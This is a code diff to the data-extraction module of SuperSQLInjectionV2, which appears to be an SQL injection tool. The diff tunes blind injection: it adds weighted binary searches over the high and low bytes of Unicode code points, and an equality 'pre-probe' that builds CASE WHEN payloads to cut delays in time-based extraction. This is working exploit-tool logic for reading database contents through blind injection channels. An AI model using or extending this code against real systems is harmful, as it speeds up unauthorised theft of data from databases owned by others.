@@ -856,6 +856,59 @@ namespace SuperSQLInjectionV2.Models.Data
             return w * (1 + obs);
         }
 
+        /// <summary>码点高字节（floor(x/256) 候选1~255）权重：常用汉字区0x4E~0x9F最高，扩展A/符号区次之，其余兜底</summary>
+        private static Dictionary<int, double>? _hiByteWeight;
+        private static Dictionary<int, double> HiByteWeight
+        {
+            get
+            {
+                if (_hiByteWeight == null)
+                {
+                    var dic = new Dictionary<int, double>();
+                    for (int v = 0x4E; v <= 0x9F; v++)
+                    {
+                        dic[v] = 0.05;   //CJK常用汉字区（一~龥）
+                    }
+                    for (int v = 0x30; v <= 0x4D; v++)
+                    {
+                        dic[v] = 0.01;   //CJK扩展A/注音符号区
+                    }
+                    for (int v = 0xA0; v <= 0xFF; v++)
+                    {
+                        dic[v] = 0.008;  //兼容区/扩展B~F上段
+                    }
+                    for (int v = 0x20; v <= 0x2F; v++)
+                    {
+                        dic[v] = 0.006;  //标点/数学符号区
+                    }
+                    _hiByteWeight = dic;
+                }
+                return _hiByteWeight;
+            }
+        }
+
+        /// <summary>码点低字节（x%256 候选0~255）权重：UTF-16低字节分布近似平坦，给均匀权重（观测漂移自适应）</summary>
+        private static Dictionary<int, double>? _loByteWeight;
+        private static Dictionary<int, double> LoByteWeight
+        {
+            get
+            {
+                if (_loByteWeight == null)
+                {
+                    var dic = new Dictionary<int, double>();
+                    for (int v = 0; v <= 255; v++)
+                    {
+                        dic[v] = 0.01;
+                    }
+                    _loByteWeight = dic;
+                }
+                return _loByteWeight;
+            }
+        }
+
+        /// <summary>码点1~255候选集（低码值车道/高字节共用）</summary>
+        private static readonly List<int> LowCodepointCache = Enumerable.Range(1, 255).ToList();
+
         //---------------- n-gram 字符预测模型融入逐字符二分 ----------------
         //模型概率只替换权重来源：候选全集不裁剪（猜错只会变慢不会读错），
         //权重下限兜底（不在模型分布内的字符保留 静态权重×0.35/0.5），
@@ -896,9 +949,11 @@ namespace SuperSQLInjectionV2.Models.Data
 
         /// <summary>
         /// 频率有序 IN 集合二分：候选须保证包含真实值（调用方经ASCII预检/hex输出特性保证），收敛到唯一候选即返回。
-        /// prefix非空且候选为全ASCII/字节区间时融入n-gram模型概率（只影响分组顺序，不影响候选全集）
+        /// prefix非空且候选为全ASCII/字节区间时融入n-gram模型概率（只影响分组顺序，不影响候选全集）；
+        /// weightBase非空时替换静态频率权重来源（码点高/低字节等非字符语义场景，观测漂移仍然生效）
         /// </summary>
-        private static async Task<int> GetBoolValueFreq(AppConfig config, string payload, List<int> candidates, string? prefix = null)
+        private static async Task<int> GetBoolValueFreq(AppConfig config, string payload, List<int> candidates, string? prefix = null,
+            Dictionary<int, double>? weightBase = null)
         {
             //n-gram权重融合：仅全区间候选（ASCII 1~127 / 字节 0~255）启用；hex等小字符集/自定义字符集不动
             Dictionary<int, double>? dist = null;
@@ -912,7 +967,18 @@ namespace SuperSQLInjectionV2.Models.Data
             double floorFactor = byteRange ? 0.5 : 0.35;
             double BlendWeight(int v)
             {
-                double w = EffWeight(v);
+                double w;
+                if (weightBase != null)
+                {
+                    //自定义权重表（码点高/低字节等）：替换静态频率来源，观测漂移照旧叠加
+                    double bw = weightBase.TryGetValue(v, out double wb) ? wb : 0.0005;
+                    int obs = _charFreqObserved.TryGetValue(v, out int o) ? o : 0;
+                    w = bw * (1 + obs);
+                }
+                else
+                {
+                    w = EffWeight(v);
+                }
                 if (dist == null)
                 {
                     return w;
@@ -929,6 +995,31 @@ namespace SuperSQLInjectionV2.Models.Data
                 return found ? w * (1 + 12 * trust * p) : w * floorFactor;
             }
             var list = candidates.OrderByDescending(v => BlendWeight(v)).ToList();
+            //时间盲注等值预探：sleep模板"条件真才延时"，判真代价=整个延时秒数，判假≈RTT（毫秒级）。
+            //频率二分50/50切组，每字符平均~2.2次判真；等值预探对最高频候选逐个单值猜测，
+            //命中=恰好1次判真即收敛，未命中=快速miss且候选集缩小（后续二分集合更小）。
+            //候选数>8才启用（hex等小字符集二分本就~3.5次，预探收益小）；
+            //仅时间通道启用——bool/相似度通道探测不延时，预探是纯浪费发包。
+            if (config.DataConfig.EffectiveBoolType == BoolInjectType.Time && list.Count > 8)
+            {
+                if (Environment.GetEnvironmentVariable("SQLI_DEBUG") == "1")
+                {
+                    Log.Show("[preprobe] 触发等值预探，候选数=" + list.Count);
+                }
+                int preProbeLimit = Math.Min(6, list.Count / 2);
+                for (int i = 0; i < preProbeLimit && list.Count > 1; i++)
+                {
+                    config.CheckStop();
+                    int cand = list[0];
+                    string eqCond = "(case when (" + payload + ") in (" + cand + ") then 1 else 0 end)";
+                    if (await ProbeBool(config, eqCond, 0).ConfigureAwait(false))
+                    {
+                        list = new List<int> { cand };
+                        break;
+                    }
+                    list.RemoveAt(0);
+                }
+            }
             while (list.Count > 1)
             {
                 config.CheckStop();
@@ -1928,9 +2019,18 @@ namespace SuperSQLInjectionV2.Models.Data
                     return await GetBoolValueAsciiFreq(config, payload, AsciiPrefix(chars, index)).ConfigureAwait(false);
                 }
                 bool hi = await ProbeBool(config, payload, 255).ConfigureAwait(false);
-                return hi
-                    ? await GetBoolValue(config, payload, 256, 65535).ConfigureAwait(false)
-                    : await GetBoolValue(config, payload, 1, 255).ConfigureAwait(false);
+                if (!hi)
+                {
+                    //1~255频率IN二分（时间通道含等值预探）：ASCII高频字符~1次判真收敛，
+                    //较均匀二分（恒8次/~4次判真）发包与延时双降
+                    return await GetBoolValueFreq(config, payload, LowCodepointCache).ConfigureAwait(false);
+                }
+                //多字节码点两段式：高字节=floor(x/256)、低字节=x%256，各走0~255频率IN二分
+                //（URL长度可控，等值预探生效；CJK高字节0x4E~0x9F权重前置），
+                //较256~65535均匀二分（16次/~8次判真）发包≈-30%、判真≈-40%
+                int hiByte = await GetBoolValueFreq(config, "floor((" + payload + ")/256)", LowCodepointCache, null, HiByteWeight).ConfigureAwait(false);
+                int loByte = await GetBoolValueFreq(config, "((" + payload + ")%256)", ByteRangeCache, null, LoByteWeight).ConfigureAwait(false);
+                return hiByte * 256 + loByte;
             }).ConfigureAwait(false);
             if (gbkDecode && code > 255)
             {
